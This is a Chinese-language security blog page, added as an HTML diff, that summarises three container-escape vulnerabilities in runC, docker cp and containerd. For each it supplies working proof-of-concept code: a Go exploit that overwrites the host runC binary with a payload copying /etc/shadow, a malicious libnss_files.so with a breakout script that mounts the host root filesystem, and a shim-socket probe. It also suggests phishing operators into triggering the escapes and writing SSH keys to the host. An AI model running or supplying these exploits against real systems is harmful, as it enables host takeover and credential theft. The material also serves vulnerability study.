@@ -1,0 +1,756 @@
+<!DOCTYPE html>
+<html lang="en">
+
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>常见容器漏洞总结 | 小九博客</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="format-detection" content="telphone=no, email=no">
+    <meta name="root" content="/">
+    <link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/Nash-x9/blog_assets@latest/img/avatar.jpg"><meta name="keywords" content="小九博客,PHP,程序员,yii2,教程,黑客,信息安全,安全开发"><meta name="theme-color" content="#282a2c">
+
+    
+        
+            <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Nash-x9/blog_assets@latest/css/bootstrap.min.css?ver=4.5.0" type="text/css" media="all">
+        
+            <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Nash-x9/blog_assets@latest/css/fontawesome.min.css?ver=5.13.0" type="text/css" media="all">
+        
+            <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Nash-x9/blog_assets@latest/css/iconfont.min.css?ver=3.1.0" type="text/css" media="all">
+        
+            <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Nash-x9/blog_assets@latest/css/layer.min.css?ver=3.1.1" type="text/css" media="all">
+        
+            <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Nash-x9/blog_assets@latest/css/kratos.min.css?ver=3.2.5" type="text/css" media="all">
+        
+    
+    <script src="/js/jquery.min.js?ver=3.4.1"></script>
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+<body>
+
+<div class="k-header">
+    <nav class="k-nav navbar navbar-expand-lg navbar-light fixed-top" style=&#34;background: #282a2c&#34;>
+        <div class="container">
+            <a class="navbar-brand" href="/">
+                
+                    <h1>小九博客</h1>
+                
+            </a>
+            
+                <button class="navbar-toggler navbar-toggler-right" id="navbutton" type="button" data-toggle="collapse"
+                        data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false"
+                        aria-label="Toggle navigation">
+                    <span class="line first-line"></span>
+                    <span class="line second-line"></span>
+                    <span class="line third-line"></span>
+                </button>
+                <div id="navbarResponsive" class="collapse navbar-collapse">
+                    <ul id="menu" class="navbar-nav ml-auto">
+                        <li class="nav-item"><a title="首页" href="/" class="nav-link" aria-current="page">首页</a></li>
+                        
+                            
+                            
+                            <li class="nav-item ">
+                                
+                                    <a href="/categories/develop" title="编程开发"
+                                       class="nav-link" aria-current="page">编程开发</a>
+                                
+                            </li>
+                        
+                            
+                            
+                            <li class="nav-item ">
+                                
+                                    <a href="/categories/security" title="信息安全"
+                                       class="nav-link" aria-current="page">信息安全</a>
+                                
+                            </li>
+                        
+                            
+                            
+                            <li class="nav-item ">
+                                
+                                    <a href="/categories/resources" title="工具资源"
+                                       class="nav-link" aria-current="page">工具资源</a>
+                                
+                            </li>
+                        
+                            
+                            
+                            <li class="nav-item ">
+                                
+                                    <a href="/categories/myspace" title="随笔"
+                                       class="nav-link" aria-current="page">随笔</a>
+                                
+                            </li>
+                        
+                            
+                            
+                            <li class="nav-item dropdown">
+                                
+                                    <a href="#" title="在线工具" data-toggle="dropdown" aria-haspopup="true"
+                                       aria-expanded="false" class="dropdown-toggle nav-link">在线工具</a>
+                                    <ul class="dropdown-menu" aria-labelledby="menu-item-dropdown-13" role="menu">
+                                        
+                                            <li class="nav-item"><a title="Json解析"
+                                                                    target="_blank" rel="noopener" href="http://www.bejson.com"
+                                                                    class="dropdown-item">Json解析</a></li>
+                                        
+                                            <li class="nav-item"><a title="JavaRuntimeExec"
+                                                                    href="/JavaRuntimeExecPayload.html"
+                                                                    class="dropdown-item">JavaRuntimeExec</a></li>
+                                        
+                                    </ul>
+                                
+                            </li>
+                        
+                            
+                            
+                            <li class="nav-item ">
+                                
+                                    <a href="/about" title="关于"
+                                       class="nav-link" aria-current="page">关于</a>
+                                
+                            </li>
+                        
+                    </ul>
+                </div>
+            
+        </div>
+    </nav>
+    <div class="banner">
+        <div class="overlay"></div>
+        <div class="content text-center" style="background-image: url(https://cdn.jsdelivr.net/gh/Nash-x9/blog_assets@latest/img/background.png);">
+            <div class="introduce animated fadeInUp">
+                <div class="title">小九博客</div>
+                <div class="mate">Hack The World!</div>
+            </div>
+        </div>
+    </div>
+</div>
+<div class="k-main banner" style="background:#f5f5f5">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 details">
+                <div class="article">
+    
+        <div class="breadcrumb-box">
+            <ol class="breadcrumb">
+                <li class="breadcrumb-item">
+                    <a class="text-dark" href="/"> 首页</a>
+                </li>
+                <li class="breadcrumb-item">
+                    <a class="text-dark"
+                       href="/categories/security">信息安全</a>
+                </li>
+                <li class="breadcrumb-item active" aria-current="page"> 正文</li>
+            </ol>
+        </div>
+    
+    <div class="header">
+        <h1 class="title">常见容器漏洞总结</h1>
+        <div class="meta">
+            <div class="a-meta post-meta">
+        <span class=" d-none d-md-block">
+            <span class="mr-2"><i class="kicon i-calendar"></i>2021年05月07日</span>
+            <!--            <span class="mr-2"><i class="kicon i-comments"></i><?php comments_number('0', '1', '%'); _e('条评论', 'kratos'); ?></span>-->
+        </span>
+    <span class="  d-block">
+        </span>
+    
+</div>
+        </div>
+    </div>
+    <div class="content">
+        <h1 id="常见容器漏洞总结"><a href="#常见容器漏洞总结" class="headerlink" title="常见容器漏洞总结"></a>常见容器漏洞总结</h1><p><img src="https://i.loli.net/2021/05/07/WfHIBLo4C3XGdpT.jpg" alt="云安全.jpg"></p>
+<blockquote>
+<p>本文在对常见容器漏洞进行了总结，在总结过程中发现了大量优秀的文章及利用工具集。未完待续..</p>
+<p><a target="_blank" rel="noopener" href="https://security.tencent.com/index.php/blog/msg/183%E3%80%8A%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%AD%E7%9A%84%E4%BA%91%E5%8E%9F%E7%94%9F%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%8F%8A%E5%88%A9%E7%94%A8%E5%AE%9E%E5%BD%95%E3%80%8B">https://security.tencent.com/index.php/blog/msg/183《红蓝对抗中的云原生漏洞挖掘及利用实录》</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/cdk-team/CDK">https://github.com/cdk-team/CDK</a> 容器环境利用工具集</p>
+</blockquote>
+<h2 id="Docker-RunC漏洞致容器逃逸-CVE-2019-5736"><a href="#Docker-RunC漏洞致容器逃逸-CVE-2019-5736" class="headerlink" title="Docker-RunC漏洞致容器逃逸(CVE-2019-5736)"></a>Docker-RunC漏洞致容器逃逸(CVE-2019-5736)</h2><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ul>
+<li>Docker Version &lt; 18.09.2</li>
+<li>RunC Version &lt;1.0-rc6</li>
+<li>攻击者具有容器文件上传权限 &amp; 管理员使用exec访问容器 || 攻击者具有启动容器权限</li>
+</ul>
+<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>攻击者可以将容器中的目标文件替换成指向runC的自己的文件来欺骗runC执行自己。比如目标文件是<code>/bin/bash</code>，将它替换成指定解释器路径为<code>#!/proc/self/exe</code>的可执行脚本，在容器中执行<code>/bin/bash</code>时将执行<code>/proc/self/exe</code>，它指向host上的runC文件。然后攻击者可以继续写入<code>/proc/self/exe</code>试图覆盖host上的runC文件。但是一般来说不会成功，因为内核不允许在执行runC时覆盖它。为了解决这个问题，攻击者可以使用O_PATH标志打开<code>/proc/self/exe</code>的文件描述符，然后通过<code>/proc/self/fd/&lt;nr&gt;</code>使用O_WRONLY标志重新打开文件，并尝试在一个循环中从一个单独的进程写入该文件。当runC退出时覆盖会成功，在此之后，runC可以用来攻击其它容器或host。</p>
+<h3 id="漏洞POC"><a href="#漏洞POC" class="headerlink" title="漏洞POC"></a>漏洞POC</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="comment">// Implementation of CVE-2019-5736</span></span><br><span class="line"><span class="comment">// Created with help from @singe, @_cablethief, and @feexd.</span></span><br><span class="line"><span class="comment">// This commit also helped a ton to understand the vuln</span></span><br><span class="line"><span class="comment">// https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9d</span></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">	<span class="string">&quot;strconv&quot;</span></span><br><span class="line">	<span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// This is the line of shell commands that will execute on the host</span></span><br><span class="line"><span class="keyword">var</span> payload = <span class="string">&quot;#!/bin/bash \n cat /etc/shadow &gt; /tmp/shadow &amp;&amp; chmod 777 /tmp/shadow&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// First we overwrite /bin/sh with the /proc/self/exe interpreter path</span></span><br><span class="line">	fd, err := os.Create(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Fprintln(fd, <span class="string">&quot;#!/proc/self/exe&quot;</span>)</span><br><span class="line">	err = fd.Close()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(<span class="string">&quot;[+] Overwritten /bin/sh successfully&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Loop through all processes to find one whose cmdline includes runcinit</span></span><br><span class="line">	<span class="comment">// This will be the process created by runc</span></span><br><span class="line">	<span class="keyword">var</span> found <span class="keyword">int</span></span><br><span class="line">	<span class="keyword">for</span> found == <span class="number">0</span> &#123;</span><br><span class="line">		pids, err := ioutil.ReadDir(<span class="string">&quot;/proc&quot;</span>)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			fmt.Println(err)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span> _, f := <span class="keyword">range</span> pids &#123;</span><br><span class="line">			fbytes, _ := ioutil.ReadFile(<span class="string">&quot;/proc/&quot;</span> + f.Name() + <span class="string">&quot;/cmdline&quot;</span>)</span><br><span class="line">			fstring := <span class="keyword">string</span>(fbytes)</span><br><span class="line">			<span class="keyword">if</span> strings.Contains(fstring, <span class="string">&quot;runc&quot;</span>) &#123;</span><br><span class="line">				fmt.Println(<span class="string">&quot;[+] Found the PID:&quot;</span>, f.Name())</span><br><span class="line">				found, err = strconv.Atoi(f.Name())</span><br><span class="line">				<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">					fmt.Println(err)</span><br><span class="line">					<span class="keyword">return</span></span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// We will use the pid to get a file handle for runc on the host.</span></span><br><span class="line">	<span class="keyword">var</span> handleFd = <span class="number">-1</span></span><br><span class="line">	<span class="keyword">for</span> handleFd == <span class="number">-1</span> &#123;</span><br><span class="line">		<span class="comment">// Note, you do not need to use the O_PATH flag for the exploit to work.</span></span><br><span class="line">		handle, _ := os.OpenFile(<span class="string">&quot;/proc/&quot;</span>+strconv.Itoa(found)+<span class="string">&quot;/exe&quot;</span>, os.O_RDONLY, <span class="number">0777</span>)</span><br><span class="line">		<span class="keyword">if</span> <span class="keyword">int</span>(handle.Fd()) &gt; <span class="number">0</span> &#123;</span><br><span class="line">			handleFd = <span class="keyword">int</span>(handle.Fd())</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(<span class="string">&quot;[+] Successfully got the file handle&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Now that we have the file handle, lets write to the runc binary and overwrite it</span></span><br><span class="line">	<span class="comment">// It will maintain it&#x27;s executable flag</span></span><br><span class="line">	<span class="keyword">for</span> &#123;</span><br><span class="line">		writeHandle, _ := os.OpenFile(<span class="string">&quot;/proc/self/fd/&quot;</span>+strconv.Itoa(handleFd), os.O_WRONLY|os.O_TRUNC, <span class="number">0700</span>)</span><br><span class="line">		<span class="keyword">if</span> <span class="keyword">int</span>(writeHandle.Fd()) &gt; <span class="number">0</span> &#123;</span><br><span class="line">			fmt.Println(<span class="string">&quot;[+] Successfully got write handle&quot;</span>, writeHandle)</span><br><span class="line">			writeHandle.Write([]<span class="keyword">byte</span>(payload))</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">攻击者在容器内执行</span></span><br><span class="line">CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go #编译POC</span><br><span class="line">chmod 777 main</span><br><span class="line">./main #执行Payload</span><br></pre></td></tr></table></figure>
+<p>后续可结合钓鱼邮件等手法，等待运维人员去通过exec访问容器的/bin/bash。使用如下命令：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker exec -it  cafa20cfb0f9 /bin/sh</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>ref: </p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Frichetten/CVE-2019-5736-PoC">https://github.com/Frichetten/CVE-2019-5736-PoC</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/170762">https://www.anquanke.com/post/id/170762</a></p>
+</blockquote>
+<h2 id="Docker-cp漏洞致容器逃逸-CVE-CVE-2019-14271"><a href="#Docker-cp漏洞致容器逃逸-CVE-CVE-2019-14271" class="headerlink" title="Docker-cp漏洞致容器逃逸(CVE-CVE-2019-14271)"></a>Docker-cp漏洞致容器逃逸(CVE-CVE-2019-14271)</h2><h3 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h3><ul>
+<li>Docker Version  == 19.03 &amp;&amp; &lt;19.03.1</li>
+</ul>
+<h3 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>Docker采用Golang编写，更具体一些，存在漏洞的Docker版本采用Go v1.11编译。在这个版本中，包含嵌入式C代码（<code>cgo</code>）的某些package会在运行时动态加载共享库。这些package包括<code>net</code>及<code>os/user</code>，<code>docker-tar</code>都用到了这两个package，会在运行时动态加载一些<code>libnss_*.so</code>库。正常情况下，程序库会从宿主机的文件系统中加载，然而由于<code>docker-tar</code>会<code>chroot</code>到容器中，因此会从容器的文件系统中加载这些库。这意味着<code>docker-tar</code>会加载并执行受容器控制的代码。</p>
+<h3 id="漏洞POC-1"><a href="#漏洞POC-1" class="headerlink" title="漏洞POC"></a>漏洞POC</h3><p>恶意so：libnss_files.so by C</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> ...</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ORIGINAL_LIBNSS <span class="meta-string">&quot;/original_libnss_files.so.2&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LIBNSS_PATH <span class="meta-string">&quot;/lib/x86_64-linux-gnu/libnss_files.so.2&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">is_priviliged</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">__attribute__ ((constructor)) <span class="function"><span class="keyword">void</span> <span class="title">run_at_link</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     <span class="keyword">char</span> * argv_break[<span class="number">2</span>];</span><br><span class="line">     <span class="keyword">if</span> (!is_priviliged())</span><br><span class="line">           <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">     rename(ORIGINAL_LIBNSS, LIBNSS_PATH);</span><br><span class="line">     <span class="built_in">fprintf</span>(log_fp, <span class="string">&quot;switched back to the original libnss_file.so&quot;</span>);</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (!fork())</span><br><span class="line">     &#123;</span><br><span class="line"></span><br><span class="line">           <span class="comment">// Child runs breakout</span></span><br><span class="line">           argv_break[<span class="number">0</span>] = strdup(<span class="string">&quot;/breakout&quot;</span>);</span><br><span class="line">           argv_break[<span class="number">1</span>] = <span class="literal">NULL</span>;</span><br><span class="line">           execve(<span class="string">&quot;/breakout&quot;</span>, argv_break, <span class="literal">NULL</span>);</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">           wait(<span class="literal">NULL</span>); <span class="comment">// Wait for child</span></span><br><span class="line"></span><br><span class="line">     <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">is_priviliged</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     FILE * proc_file = fopen(<span class="string">&quot;/proc/self/exe&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">     <span class="keyword">if</span> (proc_file != <span class="literal">NULL</span>)</span><br><span class="line">     &#123;</span><br><span class="line">           fclose(proc_file);</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">// can open so /proc exists, not privileged</span></span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">// we&#x27;re running in the context of docker-tar</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>breakout脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line"></span><br><span class="line">umount &#x2F;host_fs &amp;&amp; rm -rf &#x2F;host_fs</span><br><span class="line">mkdir &#x2F;host_fs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mount -t proc none &#x2F;proc     # mount the host&#39;s procfs over &#x2F;proc</span><br><span class="line">cd &#x2F;proc&#x2F;1&#x2F;root              # chdir to host&#39;s root</span><br><span class="line">mount --bind . &#x2F;host_fs      # mount host root at &#x2F;host_fs</span><br><span class="line">echo &quot;Hello from within the container!&quot; &gt; &#x2F;host_fs&#x2F;evil</span><br></pre></td></tr></table></figure>
+<h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><blockquote>
+<p>待完善，暂未复现，大致思路如下</p>
+</blockquote>
+<p>1.编译libnss_files.c为libnss_files.so</p>
+<p>2.修改breakout脚本，例如写ssh key 等</p>
+<p>3.等待或通过钓鱼邮件等手段，使得运维人员执行<code>docker cp</code></p>
+<blockquote>
+<p>ref:</p>
+<p><a target="_blank" rel="noopener" href="https://unit42.paloaltonetworks.com/docker-patched-the-most-severe-copy-vulnerability-to-date-with-cve-2019-14271/">https://unit42.paloaltonetworks.com/docker-patched-the-most-severe-copy-vulnerability-to-date-with-cve-2019-14271/</a></p>
+</blockquote>
+<h2 id="Docker-Containerd漏洞致容器逃逸-CVE-2020-15257"><a href="#Docker-Containerd漏洞致容器逃逸-CVE-2020-15257" class="headerlink" title="Docker-Containerd漏洞致容器逃逸(CVE-2020-15257)"></a>Docker-Containerd漏洞致容器逃逸(CVE-2020-15257)</h2><h3 id="利用条件-2"><a href="#利用条件-2" class="headerlink" title="利用条件"></a>利用条件</h3><ul>
+<li>containerd &lt; 1.4.3</li>
+<li>containerd &lt; 1.3.9</li>
+<li>使用hostnetwork网络模式启动容器 &amp;&amp; 使用root用户(UID:0)启动容器</li>
+</ul>
+<h3 id="漏洞原理-2"><a href="#漏洞原理-2" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>使用hostnetwork网络模式中，容器和主机共享网络命名空间，因此在容器内可以访问host特定的socket文件(shim.sock)。可通过启动一个新的容器，该容器挂在host目录到容器的/host目录，即可实现对host完全的读写。</p>
+<h3 id="漏洞POC-2"><a href="#漏洞POC-2" class="headerlink" title="漏洞POC"></a>漏洞POC</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;context&quot;</span></span><br><span class="line">    <span class="string">&quot;errors&quot;</span></span><br><span class="line">    <span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">    <span class="string">&quot;log&quot;</span></span><br><span class="line">    <span class="string">&quot;net&quot;</span></span><br><span class="line">    <span class="string">&quot;regexp&quot;</span></span><br><span class="line">    <span class="string">&quot;strings&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;github.com/containerd/ttrpc&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/gogo/protobuf/types&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">exp</span><span class="params">(sock <span class="keyword">string</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">    sock = strings.Replace(sock, <span class="string">&quot;@&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="number">-1</span>)</span><br><span class="line">    conn, err := net.Dial(<span class="string">&quot;unix&quot;</span>, <span class="string">&quot;\x00&quot;</span>+sock)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Println(err)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    client := ttrpc.NewClient(conn)</span><br><span class="line">    shimClient := NewShimClient(client)</span><br><span class="line">    ctx := context.Background()</span><br><span class="line">    info, err := shimClient.ShimInfo(ctx, &amp;types.Empty&#123;&#125;)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Println(<span class="string">&quot;rpc error:&quot;</span>, err)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    log.Println(<span class="string">&quot;shim pid:&quot;</span>, info.ShimPid)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getShimSockets</span><span class="params">()</span> <span class="params">([][]<span class="keyword">byte</span>, error)</span></span> &#123;</span><br><span class="line">    re, err := regexp.Compile(<span class="string">&quot;@/containerd-shim/.*\\.sock&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">    &#125;</span><br><span class="line">    data, err := ioutil.ReadFile(<span class="string">&quot;/proc/net/unix&quot;</span>)</span><br><span class="line">    matches := re.FindAll(data, <span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">if</span> matches == <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>, errors.New(<span class="string">&quot;Cannot find vulnerable socket&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> matches, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    matchset := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">bool</span>)</span><br><span class="line">    socks, err := getShimSockets()</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Fatalln(err)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> _, b := <span class="keyword">range</span> socks &#123;</span><br><span class="line">        sockname := <span class="keyword">string</span>(b)</span><br><span class="line">        <span class="keyword">if</span> _, ok := matchset[sockname]; ok &#123;</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        &#125;</span><br><span class="line">        log.Println(<span class="string">&quot;try socket:&quot;</span>, sockname)</span><br><span class="line">        matchset[sockname] = <span class="literal">true</span></span><br><span class="line">        <span class="keyword">if</span> exp(sockname) &#123;</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
